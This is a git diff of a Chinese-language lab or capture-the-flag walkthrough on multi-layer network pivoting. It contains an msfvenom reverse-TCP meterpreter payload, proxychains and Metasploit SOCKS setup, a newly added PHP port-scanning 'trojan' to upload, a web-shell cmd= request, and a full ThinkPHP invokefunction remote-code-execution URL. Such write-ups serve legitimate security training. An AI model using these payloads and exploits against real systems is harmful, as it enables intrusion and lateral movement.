@@ -12,7 +12,9 @@
 
 ## 实验步骤
 
-### 步骤一 设立立足点并发现靶标2-3
+### 步骤一 攻击入口靶标并getflag
+
+### 步骤二 设立立足点并发现靶标2-3
 
 1. 在攻击者主机上生成meterpreter.elf文件
 `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<攻击者主机IP> LPORT=<端口> -f elf > meterpreter.elf`
@@ -69,12 +71,51 @@ run
 ![](./pics/socks代理.png)<br>
 ![](./pics/查看1080端口服务开放情况.png)<br>
 `cat /etc/proxychains4.conf` 
-确认有以下配置
+确认有以下配置<br>
 ![](./pics/修改proxychains配置.png)<br>
 并且配置浏览器代理,方便直接从浏览器访问网页
 ![](./pics/代理3.png)<br>
 
-### 步骤二 攻击新发现的靶机
+**完成入口靶标的提权行为后，可以继续尝试上传一些不同的木马文件，例如：**
+**扫描下层ip和端口开放情况**
+
+```sh
+<?php
+// 定义目标主机列表
+$hosts = ['192.170.84.2', '192.170.84.3', '192.170.84.4'];
+
+// 定义需要扫描的端口范围
+$ports = range(79, 81);
+
+// 超时时间（秒）
+$timeout = 1;
+
+echo "<table border='1'>";
+echo "<tr><th>主机</th><th>端口</th><th>状态</th></tr>";
+
+foreach ($hosts as $host) {
+    foreach ($ports as $port) {
+        $fp = @fsockopen($host, $port, $errno, $errstr, $timeout);
+        if ($fp) {
+            // 端口开放
+            $status = "开放";
+            fclose($fp);
+        } else {
+            // 端口关闭或超时
+            $status = "关闭";
+        }
+        echo "<tr><td>{$host}</td><td>{$port}</td><td>{$status}</td></tr>";
+    }
+}
+
+echo "</table>";
+?>
+```
+
+可以在网页上看到上传成功，点击以后打印扫描结果
+![](./pics/木马扫描.png)
+
+### 步骤三 攻击新发现的靶机
 
 #### nginx
 
@@ -83,7 +124,7 @@ nginx
 `proxychains curl http://192.170.84.2`
 ![](./pics/访问第二台主机.png)<br>
 
-2. 根据提示执行以下命令
+2. 根据提示执行以下命令，即可getflag
 `proxychains curl http://<目标IP>/index.php?cmd=ls%20/tmp`
 ![](./pics/第二个flag.png)<br>
 
@@ -101,7 +142,7 @@ run
 2. get flag
 ![](./pics/getflag3.png)<br>
 
-### 步骤三 设立pivot路由并发现靶标4-5
+### 步骤四 设立pivot路由并发现靶标4-5
 
 1. 查看第一层两台主机的ip
 
@@ -114,7 +155,7 @@ run
 3. 设置pivot路由
 ![](./pics/添加pivot路由3.png)<br>
 
-### 步骤四 攻击靶标4-5
+### 步骤五 攻击靶标4-5
 
 #### weblogic
 
@@ -128,12 +169,12 @@ set Proxies socks5:127.0.0.1:1080
 # 设置完成以后再进行攻击
 run
 ```
-会话窗口开启以后，进入shell，输入ls /tmp
+会话窗口开启以后，进入shell，输入ls /tmp，getflag
 ![](./pics/拿到flag3.png)
 
 #### apache
 
-### 步骤五 发现终点靶标
+### 步骤六 发现终点靶标
 
 同样，ip a查看第二层靶机的网卡，发现双网卡
 ![](./pics/发现双网卡.png)
@@ -148,7 +189,7 @@ run
 扫描发现终点靶标
 ![](./pics/发现终点靶标.png)<br>
 
-### 步骤六 攻击终点靶标
+### 步骤七 攻击终点靶标
 
 #### thinkphp
 
@@ -159,7 +200,7 @@ cve_2018_1002015
 2. 浏览器访问以下网页，执行phpinfo()
 `http://<目标IP>:<端口>/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1`
 ![](./pics/phpinfo.png)<br>
-3. 执行系统命令`ls /tmp`
+3. 执行系统命令`ls /tmp`，getflag
 
 `http://<目标IP>:<端口>/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=ls%20/tmp`
 ![](./pics/第三个flag.png)<br>
